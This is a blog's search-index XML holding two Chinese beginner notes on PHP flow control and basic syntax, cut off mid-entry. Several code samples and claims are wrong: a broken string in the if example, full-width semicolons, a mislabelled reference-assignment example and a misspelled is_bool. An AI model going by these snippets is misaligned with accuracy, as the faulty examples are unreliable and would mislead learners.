<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/08/05/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/"/>
      <url>/2021/08/05/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><strong>对PHP程序执行的过程进行控制！</strong><br><a name="mB7Co"></a></p><h1 id="一、顺序执行"><a href="#一、顺序执行" class="headerlink" title="一、顺序执行"></a>一、顺序执行</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行到第一步!&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行到第二步!&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><br />**  自上而下的执行即可！    对这个执行过程没有控制！**<br><a name="MRd4D"></a></p><h1 id="二、分支执行"><a href="#二、分支执行" class="headerlink" title="二、分支执行"></a>二、分支执行</h1><p><strong>分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句（if switch ）来实现</strong><br><a name="1HsNI"></a></p><h2 id="1-if语句"><a href="#1-if语句" class="headerlink" title="1.if语句"></a>1.if语句</h2><p><a name="7lZfz"></a></p><h3 id="1）单向条件"><a href="#1）单向条件" class="headerlink" title="1）单向条件"></a>1）单向条件</h3><p>  if（表达式）  语句1；<br />                           表达式的值为true   那么就执行后面的语句1，否则不执行！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> =<span class="number">60</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">40</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="variable">$pass</span>)  &#123;</span><br><span class="line">  <span class="keyword">echo</span><span class="string">&#x27;考试通过！&#x27;</span>;</span><br><span class="line">  <span class="string">&#x27;666&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">  //任何其他语句</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  echo   &#x27;</span>不及格！<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">//不及格</span></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628155425381-c44c07ad-b9fc-4924-a651-eb59c6119e4e.png#align=left&display=inline&height=241&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=287&size=15615&status=done&style=none&width=287" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br><a name="yioLo"></a></p><h3 id="2）双向条件"><a href="#2）双向条件" class="headerlink" title="2）双向条件"></a>2）双向条件</h3><p>**  if  else 语句**<br><a name="TU0HI"></a></p><h3 id="3）多向条件"><a href="#3）多向条件" class="headerlink" title="3）多向条件"></a>3）多向条件</h3><p><strong>if  elseif  elseif</strong><br><a name="VADIt"></a></p><h2 id="2-switch语句"><a href="#2-switch语句" class="headerlink" title="2.switch语句"></a>2.switch语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> 值 <span class="number">1</span>:<span class="comment">//case相当于==</span></span><br><span class="line">语句块<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 值 <span class="number">2</span>:</span><br><span class="line">语句块<span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">.......</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">语句块n</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="Xm5TL"></a></p><h1 id="三、循环执行"><a href="#三、循环执行" class="headerlink" title="三、循环执行"></a>三、循环执行</h1><p><a name="KhvQT"></a></p><h2 id="1-while语句"><a href="#1-while语句" class="headerlink" title="1.while语句"></a>1.while语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)&#123;</span><br><span class="line">各种语句....</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="2r2uZ"></a></p><h2 id="2-do-while-语句"><a href="#2-do-while-语句" class="headerlink" title="2.do..while 语句"></a>2.do..while 语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">各种语句</span><br><span class="line">&#125;<span class="keyword">while</span>(表达式);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="540qI"></a></p><h2 id="3-for语句"><a href="#3-for语句" class="headerlink" title="3.for语句"></a>3.for语句</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式a;表达式b;表达式c)&#123;</span><br><span class="line">各种语句</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="rLLgi"></a></p><h1 id="四、特殊的流程控制语句"><a href="#四、特殊的流程控制语句" class="headerlink" title="四、特殊的流程控制语句"></a>四、特殊的流程控制语句</h1><p><strong>1.break语句</strong><br /><strong>2.continue语句</strong><br /><strong>3.exit()语句 作用：结束当前整个程序的执行！</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/08/05/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/08/05/PHP%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a name="XVgT2"></a></p><h1 id="一、初始PHP脚本程序"><a href="#一、初始PHP脚本程序" class="headerlink" title="一、初始PHP脚本程序"></a>一、初始PHP脚本程序</h1><p><a name="VbSgT"></a></p><h2 id="1-PHP开始标记"><a href="#1-PHP开始标记" class="headerlink" title="1.PHP开始标记"></a>1.PHP开始标记</h2><p><strong>&lt;?php **<br /></strong>  2.PHP结束标记**<br />** ?&gt;**<br><a name="7G3Zz"></a></p><h3 id="1-这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。"><a href="#1-这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。" class="headerlink" title="1).   这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。"></a>1).   <?php ?>这之间就表示进入PHP模式，在开始和结束标记之外的内容都会被PHP解析器忽略。</h3><p><a name="dkmfg"></a></p><h3 id="2-可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记"><a href="#2-可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记" class="headerlink" title="2).   可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记"></a>2).   可以直接嵌入到html代码中，并且可以嵌入到html代码的任何地方，在一个html文档中可以嵌入任意多个PHP标记</h3><p><a name="KphlH"></a></p><h3 id="3）-文件末尾的PHP代码段结束标记可以不要-在一些情况下省略更好"><a href="#3）-文件末尾的PHP代码段结束标记可以不要-在一些情况下省略更好" class="headerlink" title="3）.  文件末尾的PHP代码段结束标记可以不要  在一些情况下省略更好"></a>3）.  文件末尾的PHP代码段结束标记可以不要  在一些情况下省略更好</h3><p><a name="tjZGK"></a></p><h2 id="2-指令分隔符“分号”"><a href="#2-指令分隔符“分号”" class="headerlink" title="2.指令分隔符“分号”"></a>2.指令分隔符“分号”</h2><p><a name="YU1Oy"></a></p><h3 id="1-PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！"><a href="#1-PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！" class="headerlink" title="1). PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！"></a>1). PHP语句分为两种，一种是在程序中使用结构定义语句，另外一种是在程序中使用功能执行语句，其中前者结尾不需要使用分号，后者必须使用分号结尾！</h3><p><a name="CHVrU"></a></p><h3 id="2-结束表示-gt-就隐含一个分号，所以PHP代码最后一行可以不用加分号！"><a href="#2-结束表示-gt-就隐含一个分号，所以PHP代码最后一行可以不用加分号！" class="headerlink" title="2). 结束表示 ?&gt; 就隐含一个分号，所以PHP代码最后一行可以不用加分号！"></a>2). 结束表示 ?&gt; 就隐含一个分号，所以PHP代码最后一行可以不用加分号！</h3><p><a name="AWssS"></a></p><h2 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h2><p><br /><strong>注释</strong><br /><strong>1）多行注释</strong><br /><strong>/*<strong><br /></strong>   多行注释*<em><br />**/</em></strong><br /><strong>2）单行注释</strong><br /><strong>//  我是单行注释</strong><br><a name="XBssE"></a></p><h1 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h1><p><strong>变量是用于临时（只有我们的程序在运行过程中才存在）储存值（数据）的容器</strong><br><a name="9WjrC"></a></p><h3 id="1-变量的声明"><a href="#1-变量的声明" class="headerlink" title="1.变量的声明"></a>1.变量的声明</h3><pre><code>          PHP的特性之一就是它不要求在使用变量之前声明变量，当第一次给一个变量赋值时，你才创建了这个变量，变量用于存储比如数字、文本字符串或者数组。一旦设置了某个变量，我们就可以在脚本中重复地使用它。PHP中变量必须使用一个美元符号$ 后面跟着变量名来表示，使用赋值操作符（=）给一个变量赋值。</code></pre><p><a name="WT8k2"></a></p><h3 id="2-变量的释放"><a href="#2-变量的释放" class="headerlink" title="2.变量的释放"></a>2.变量的释放</h3><pre><code>            unset()函数释放指定的变量</code></pre><p><a name="I6Qj4"></a></p><h3 id="3-变量的命名"><a href="#3-变量的命名" class="headerlink" title="3.变量的命名"></a>3.变量的命名</h3><p><a name="sYoS7"></a></p><h4 id="1）变量名是严格区分大小写的"><a href="#1）变量名是严格区分大小写的" class="headerlink" title="1）变量名是严格区分大小写的"></a>1）变量名是严格区分大小写的</h4><pre><code> $name&lt;br /&gt;     $NAME&lt;br /&gt;     $Name</code></pre><p><a name="hBqzo"></a></p><h4 id="2-变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。"><a href="#2-变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。" class="headerlink" title="2)  变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。"></a>2)  变量名由字母或者下划线开头，后面可以跟上任意数量的字母，数字，或者下划线。</h4><p><strong>变量名的标示符一定不要以数字开头，中间不可以使用空格，不能使用点分开！</strong><br />**   变量名只能包含 字母  数字  下划线  并且 必须以字母或下划线开头！！！**<br />**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;<span class="comment">//输出变量$name 的内容！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>3）PHP中有一些标示符是系统定义的，也称为关键字，是PHP语言的组成部分，因此不能使用它们中的任何一个作为常量函数名或者类名，但是和其他语音不同的是可以在PHP中作为变量名称使用，不过这样容易混淆，所以最好还是不要用PHP的关键字作为变量名称</strong><br /><strong><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1627957172302-05e915f0-03c8-4d1b-90bd-880fe0368e83.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=564&size=155570&status=done&style=none&width=564" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"></strong><br><a name="KukcF"></a></p><h3 id="4-可变变量"><a href="#4-可变变量" class="headerlink" title="4.可变变量"></a>4.可变变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$abc</span>=<span class="string">&#x27;test&#x27;</span>;<span class="comment">//定义了一个变量$abc  里面存的值为test</span></span><br><span class="line"><span class="variable">$$abc</span>=<span class="string">&#x27;tttt&#x27;</span>; <span class="comment">//$test=&#x27;tttt&#x27;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   了解即可<br><a name="kdWZL"></a></p><h3 id="5-变量的引用赋值"><a href="#5-变量的引用赋值" class="headerlink" title="5.变量的引用赋值"></a>5.变量的引用赋值</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1000</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="comment">//输出$a也为1000  $a的值不会改变</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="YzVGa"></a></p><h1 id="三、变量类型"><a href="#三、变量类型" class="headerlink" title="三、变量类型"></a>三、变量类型</h1><p>概述：变量类型是指保存在该变量中的数据类型，相同类型的数据才可互相操作。<br><a name="d6FSd"></a></p><h2 id="1-变量类型简介"><a href="#1-变量类型简介" class="headerlink" title="1.变量类型简介"></a>1.变量类型简介</h2><p>使用<strong>var_dump(变量名)**</strong> **可以输出变量的类型！<br><a name="hOcZy"></a></p><h3 id="1）bool（布尔型）"><a href="#1）bool（布尔型）" class="headerlink" title="1）bool（布尔型）"></a>1）bool（布尔型）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个是最简单的类型，布尔型表达了true或false，即真和假<br />以下值被认为false，其他则为true<br><a name="CddEN"></a></p><h4 id="1️⃣布尔值false"><a href="#1️⃣布尔值false" class="headerlink" title="1️⃣布尔值false"></a>1️⃣布尔值false</h4><p><a name="qVa8c"></a></p><h4 id="2️⃣0"><a href="#2️⃣0" class="headerlink" title="2️⃣0"></a>2️⃣0</h4><p><a name="1sWCG"></a></p><h4 id="3️⃣浮点型0-0"><a href="#3️⃣浮点型0-0" class="headerlink" title="3️⃣浮点型0.0"></a>3️⃣浮点型0.0</h4><p><a name="f6Ac2"></a></p><h4 id="4️⃣空白字符串和字符串0-空白字符串是指没有任何内容"><a href="#4️⃣空白字符串和字符串0-空白字符串是指没有任何内容" class="headerlink" title="4️⃣空白字符串和字符串0  //空白字符串是指没有任何内容"></a>4️⃣空白字符串和字符串0  //空白字符串是指没有任何内容</h4><p><a name="Y3pWx"></a></p><h4 id="5️⃣没有成员的数组"><a href="#5️⃣没有成员的数组" class="headerlink" title="5️⃣没有成员的数组"></a>5️⃣没有成员的数组</h4><p><a name="fDQbk"></a></p><h4 id="6️⃣NULL"><a href="#6️⃣NULL" class="headerlink" title="6️⃣NULL"></a>6️⃣NULL</h4><p><a name="flUXT"></a></p><h3 id="2）int-（整形）"><a href="#2）int-（整形）" class="headerlink" title="2）int （整形）"></a>2）int （整形）</h3><pre><code>  往变量里存储整数</code></pre><p><a name="oIsxZ"></a></p><h3 id="3）float（浮点型也称double）"><a href="#3）float（浮点型也称double）" class="headerlink" title="3）float（浮点型也称double）"></a>3）float（浮点型也称double）</h3><p>往变量里存小数<br><a name="eSzd8"></a></p><h3 id="4）string（字符串）"><a href="#4）string（字符串）" class="headerlink" title="4）string（字符串）"></a>4）string（字符串）</h3><p>字符串就是一系列的字符组成串在一起<br /><strong>单引号’’包括起来的不能再包含’’   要使用反斜杠\来进行转义</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;textqqq\&#x27;ssd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>双引号</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;te($b)xtqqq\&#x27;ssd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>定界符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=&lt;&lt;&lt;aaaaa</span><br><span class="line">  sdfasfsfsfffsafsfasasffsfsaasffas</span><br><span class="line">  aaaaa;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="SzgSv"></a></p><h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5)    数组"></a>5)    数组</h3><p><a name="HrJUM"></a></p><h3 id="6）object（对象）"><a href="#6）object（对象）" class="headerlink" title="6）object（对象）"></a>6）object（对象）</h3><p><a name="nybVa"></a></p><h3 id="7）resource（资源）"><a href="#7）resource（资源）" class="headerlink" title="7）resource（资源）"></a>7）resource（资源）</h3><p><a name="PL8NV"></a></p><h3 id="8）NULL"><a href="#8）NULL" class="headerlink" title="8）NULL"></a>8）NULL</h3><pre><code>    null表示一个变量没有值，表示空&lt;br /&gt;          将变量直接赋值为null&lt;br /&gt;         声明的变量就是尚未被赋值&lt;br /&gt;         被unset（）函数销毁的变量</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1111</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$a</span>);</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="BmM41"></a></p><h2 id="2-变量类型的相互转换"><a href="#2-变量类型的相互转换" class="headerlink" title="2.变量类型的相互转换"></a>2.变量类型的相互转换</h2><p><a name="xeu9P"></a></p><h3 id="1）自动类型转换"><a href="#1）自动类型转换" class="headerlink" title="1）自动类型转换"></a>1）自动类型转换</h3><p>有布尔值参与运算时，true将转化为整数1，false将转化为整数0<br />    有null值参与运算时，null值将转化为整数0再进行运算<br />    有int型和float型数据参与运算时，先把int转变为float型后再进行运算<br />    有字符串和数字型（int或者float）参与运算时的情况<br><a name="X1XsA"></a></p><h3 id="2）强制类型转换"><a href="#2）强制类型转换" class="headerlink" title="2）强制类型转换"></a>2）强制类型转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;7qwe&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">int</span>)<span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>不要给自己挖坑！！！</strong><br><a name="HKFfd"></a></p><h3 id="3）变量类型的测试函数"><a href="#3）变量类型的测试函数" class="headerlink" title="3）变量类型的测试函数"></a>3）变量类型的测试函数</h3><p>**  is_boll()<strong><br /></strong>     is_int(()<strong><br /></strong>     is_array()  等等。。。。**<br><a name="UKXMx"></a></p><h1 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h1><p><a name="jUd99"></a></p><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h2><p><strong>常量是用于临时（只有我们的程序在运行过程中才存在）储存值（数据）的容器</strong><br><a name="RAWjm"></a></p><h2 id="2-定义和使用"><a href="#2-定义和使用" class="headerlink" title="2.定义和使用"></a>2.定义和使用</h2><p><strong>define(常量名称，常量值)</strong><br /><strong>常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量标识符总是大写的</strong><br /><strong>define（’MY_NAME’,’哈哈’）</strong><br /><strong>defined()函数来检查是否定义了某个常量</strong><br /><strong>自己定义的常量是严格区分大小写的！</strong><br><a name="uUkqe"></a></p><h2 id="3-常量和变量的区别"><a href="#3-常量和变量的区别" class="headerlink" title="3.常量和变量的区别"></a>3.常量和变量的区别</h2><pre><code>1）常量前面没有美元符号$&lt;br /&gt;    2) 常量只能用define（）函数定义， 不能通过赋值语句&lt;br /&gt;    3） 常量可以不用理会变量范围的规则而在任何地方定义和使用&lt;br /&gt;    4) 常量一旦被定义 就不能被重新定义和取消定义&lt;br /&gt;    5） 常量的值只能是bool，int，float，string类型</code></pre><p><a name="DDHKD"></a></p><h2 id="4-预定义常量"><a href="#4-预定义常量" class="headerlink" title="4.预定义常量"></a>4.预定义常量</h2><pre><code>  预定义常量就是PHP内核帮我们定义好的常量&lt;br /&gt;其中有的预定义常量是以____开头的，这些常量我们又叫它**魔术常量**</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;EDG&#x27;</span>；</span><br><span class="line"> define(<span class="string">&#x27;MY_NAME&#x27;</span>,<span class="string">&#x27;EDG&#x27;</span>);</span><br><span class="line">echo__FILE__;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>预定义常量是不区分大小写的！<br><a name="vjtCI"></a></p><h1 id="五、运算符"><a href="#五、运算符" class="headerlink" title="五、运算符"></a>五、运算符</h1><p><a name="oIAmU"></a></p><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code>     **说白了就是一些符号！！！****这些符号可以将变量或者数据执行某种运算！**&lt;br /&gt;**举例:**&lt;br /&gt;**      !true  **&lt;br /&gt;**        !是运算符  true是操作数**&lt;br /&gt;**      $a+$b**&lt;br /&gt;**           =是运算符  $a,$b是操作数**&lt;br /&gt;**       true？1：0  **&lt;br /&gt;**             ?和  ：是运算符     true 和1 0 是操作数**&lt;br /&gt;** ****根据操作数个数分为  一元运算符，二元运算符，三元运算符**&lt;br /&gt;**</code></pre><p><a name="iEzYI"></a></p><h2 id="2-算数运算符"><a href="#2-算数运算符" class="headerlink" title="2.算数运算符"></a>2.算数运算符</h2><p><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628040506138-a762a774-d89d-467f-a2c3-d55a3285cb85.png#align=left&display=inline&height=376&margin=%5Bobject%20Object%5D&name=image.png&originHeight=376&originWidth=714&size=118819&status=done&style=none&width=714" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><br><a name="1kX3E"></a></p><h2 id="3-字符串运算符"><a href="#3-字符串运算符" class="headerlink" title="3.字符串运算符"></a>3.字符串运算符</h2><p>PHP中的字符串运算符<strong>只有一个英文的句号.</strong>       也叫<strong>连接运算符</strong><br />**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;孙胜利&#x27;</span>；</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;YYDS&#x27;</span>；</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="variable">$b</span>;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="oWhS3"></a></p><h2 id="4-赋值运算符"><a href="#4-赋值运算符" class="headerlink" title="4.赋值运算符"></a>4.赋值运算符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;<span class="comment">//$a=1+1;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>左边的操作数必须是变量，右边可以是一个表达式，也可以是一个值，一个变量等等！！！！</strong><br /><strong>作用：  将右边表达式的值赋给左边变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>-=<span class="variable">$b</span>;<span class="comment">//$a=$a-$b;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="nVg8x"></a></p><h2 id="5-比较运算符"><a href="#5-比较运算符" class="headerlink" title="5.比较运算符"></a>5.比较运算符</h2><p><strong>对操作数（按照比较运算符的要求，规则）进行比较</strong><br />   如果比较出的结果满足比较运算符的结果 就为true 否则为false<br /><img "" class="lazyload placeholder" data-original="https://cdn.nlark.com/yuque/0/2021/png/21656971/1628042379078-ad9a9519-63d8-4611-9c55-4841e5546f1f.png#align=left&display=inline&height=301&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=247&size=32907&status=done&style=none&width=247" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image.png"><strong>==数值相等！===类型值都相等</strong><br /><strong>PHP中规定：  使用echo输出布尔类型值的时候</strong><br />**                        echo  true；它在界面中会输出1；**<br /><strong><br />**如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更精确的结果！</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>==<span class="variable">$b</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td 